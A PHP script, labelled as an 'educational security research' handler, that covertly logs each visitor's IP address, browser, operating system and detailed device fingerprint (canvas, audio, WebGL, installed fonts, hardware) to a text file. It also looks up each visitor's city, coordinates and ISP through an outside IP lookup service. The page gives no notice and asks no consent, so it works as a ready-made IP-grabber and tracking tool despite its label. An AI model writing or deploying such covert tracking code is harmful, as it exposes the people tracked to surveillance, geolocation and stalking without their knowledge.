<?php
// Educational Security Research Framework - IP Analysis Handler
// It's recommended to log errors to a file during debugging instead of suppressing them
error_reporting(E_ALL); // Report all errors
ini_set('display_errors', 0); // Don't display errors to the user
ini_set('log_errors', 1); // Log errors
ini_set('error_log', 'educational_php_errors.log'); // Specify error log file

date_default_timezone_set("Asia/Manila");

// MODIFIED: Prioritize Cloudflare header for IP analysis
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
    else if (isset($_SERVER['HTTP_CLIENT_IP'])) $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_X_FORWARDED'])) $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_FORWARDED'])) $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if (isset($_SERVER['REMOTE_ADDR'])) $ipaddress = $_SERVER['REMOTE_ADDR'];
    else $ipaddress = 'UNKNOWN';
    if (strpos($ipaddress, ',') !== false) { $ip_parts = explode(',', $ipaddress); $ipaddress = trim($ip_parts[0]); }
    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown User Agent';

function getOS() {
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10', '/windows nt 6.3/i' => 'Windows 8.1', '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7', '/windows nt 6.0/i' => 'Windows Vista', '/windows nt 5.1/i' => 'Windows XP',
        '/macintosh|mac os x/i' => 'Mac OS X', '/android/i' => 'Android', '/iphone/i' => 'iPhone', '/ipad/i' => 'iPad', '/linux/i' => 'Linux'
    );
    foreach ($os_array as $regex => $value) { if (preg_match($regex, $user_agent)) { $os_platform = $value; break; } }
    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/edge/i' => 'Edge', '/chrome/i' => 'Chrome', '/safari/i' => 'Safari', '/firefox/i' => 'Firefox',
        '/msie/i' => 'Internet Explorer', '/trident/i' => 'Internet Explorer'
    );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            if ($value === 'Chrome' && preg_match('/edge/i', $user_agent)) continue;
            if ($value === 'Safari' && (preg_match('/chrome/i', $user_agent) || preg_match('/edge/i', $user_agent))) continue;
            $browser = $value; break;
        }
    }
    return $browser;
}

$PublicIP = get_client_ip();
$user_os = getOS();
$user_browser = getBrowser();
$localHost = "127.0.0.1";
if (strpos($PublicIP, ',') !== false) { $PublicIP = explode(",", $PublicIP)[0]; $PublicIP = trim($PublicIP); }

$file = 'educational_ip.txt';
$ip_log_line = "IP                   : ".$PublicIP;
$uaget_log_line = "User Agent           : ".$user_agent;
$bsr_log_line = "Browser              : ".$user_browser;
$uos_log_line = "User OS              : ".$user_os;

// Use cURL for ipwhois lookup
$details = null; $success = false;
if (strpos($PublicIP, $localHost) === false && filter_var($PublicIP, FILTER_VALIDATE_IP)) {
    $url = "http://ipwhois.app/json/" . urlencode($PublicIP);
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3); curl_setopt($ch, CURLOPT_FAILONERROR, true);
    $response = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); $curl_error = curl_error($ch); curl_close($ch);
    if ($response !== false && $http_code == 200) { $details = json_decode($response, true); $success = $details['success'] ?? false; }
    else { $fp_err = fopen($file, 'a'); if ($fp_err) { fwrite($fp_err, "IPWhois Error        : Failed to fetch details. HTTP Code: $http_code, cURL Error: $curl_error\n"); fclose($fp_err); } else { error_log("Failed to open educational_ip.txt to log IPWhois error."); } }
} else { $success = false; }

// --- Start logging ---
$fp = fopen($file, 'a'); if (!$fp) { error_log("Failed to open educational_ip.txt for writing."); exit("Error: Could not open educational log file."); }
fwrite($fp, "========== NEW EDUCATIONAL ANALYSIS VISITOR ==========\n"); fwrite($fp, "Date & Time          : " . date("Y-m-d H:i:s") . "\n");
fwrite($fp, $ip_log_line."\n"); fwrite($fp, $uos_log_line."\n"); fwrite($fp, $uaget_log_line."\n"); fwrite($fp, $bsr_log_line."\n");
if ($success && $details) { fwrite($fp, "Location             : ".($details['city'] ?? 'N/A').", ".($details['country'] ?? 'N/A')."\n"); fwrite($fp, "GeoLocation(lat,lon): ".($details['latitude'] ?? 'N/A').", ".($details['longitude'] ?? 'N/A')."\n"); fwrite($fp, "ISP                  : ".($details['isp'] ?? 'N/A')."\n"); fwrite($fp, "IP Timezone          : ".($details['timezone'] ?? 'N/A')."\n"); fwrite($fp, "Currency             : ".($details['currency'] ?? 'N/A')."\n"); }
else { fwrite($fp, "Location             : Could not retrieve details.\n"); }

// --- Educational Fingerprint Handling ---
$fingerprint_data = json_decode(file_get_contents('php://input'), true);
if ($fingerprint_data) {
    fwrite($fp, "========== EDUCATIONAL DEVICE FINGERPRINT ANALYSIS ==========\n");
    
    // Log basic fingerprint data
    $fields = [
        'userAgent' => 'User Agent (from FP)', 'language' => 'Language', 'platform' => 'Platform',
        'hardwareConcurrency' => 'CPU Cores', 'deviceMemory' => 'Device Memory (GB)', 'screenResolution' => 'Screen Resolution',
        'colorDepth' => 'Color Depth', 'timezone' => 'Timezone', 'touchSupport' => 'Touch Points',
        'localStorage' => 'Local Storage', 'sessionStorage' => 'Session Storage', 'indexedDB' => 'IndexedDB',
        'cookieEnabled' => 'Cookies Enabled', 'webGLRenderer' => 'WebGL Renderer', 'webGLVendor' => 'WebGL Vendor',
        'webGLUnmaskedRenderer' => 'WebGL Unmasked Renderer', 'webGLUnmaskedVendor' => 'WebGL Unmasked Vendor',
        'canvasFingerprint' => 'Canvas Fingerprint', 'audioFingerprint' => 'Audio Fingerprint', 'fonts' => 'Installed Fonts',
    ];

    foreach ($fields as $key => $label) {
        if (isset($fingerprint_data[$key])) {
            $value = $fingerprint_data[$key];
            $value_str = '';

            if ($key === 'fonts') {
                if (is_array($value)) {
                    $value_str = implode(', ', $value);
                    if (strlen($value_str) > 500) {
                        $value_str = substr($value_str, 0, 500) . '... (truncated)';
                    }
                } else {
                    $value_str = 'Invalid Font Data (Not Array)';
                }
            }
            elseif ($key === 'canvasFingerprint') {
                if (is_string($value)) {
                    if (strpos($value, 'data:image/png;base64,') === 0) {
                        $value_str = substr($value, 0, 80) . '... (truncated)';
                    } else {
                        $value_str = 'Invalid Canvas Data Prefix';
                    }
                } else {
                    $value_str = 'Invalid Canvas Data Type';
                }
            }
            elseif ($key === 'audioFingerprint') {
                $value_str = is_string($value) || is_numeric($value) ? (string)$value : 'Invalid Audio Data';
            }
            elseif (is_array($value)) {
                $value_str = json_encode($value);
            }
            elseif (is_object($value)) {
                $value_str = json_encode($value);
            }
            elseif (is_bool($value)) {
                $value_str = $value ? 'Yes' : 'No';
            }
            else {
                $value_str = (string) $value;
            }

            if ($value_str !== '' && $value_str !== '[]' && $value_str !== '{}' && !str_starts_with($value_str, 'Invalid')) {
                fwrite($fp, str_pad($label, 25) . " : " . $value_str . "\n");
            }
        }
    }
    fwrite($fp, "======================================\n");
} else {
    fwrite($fp, "Educational Fingerprint Data     : Not received in POST request.\n");
}
// --- End Educational Fingerprint Handling ---

fwrite($fp, "\n"); fclose($fp);
?>
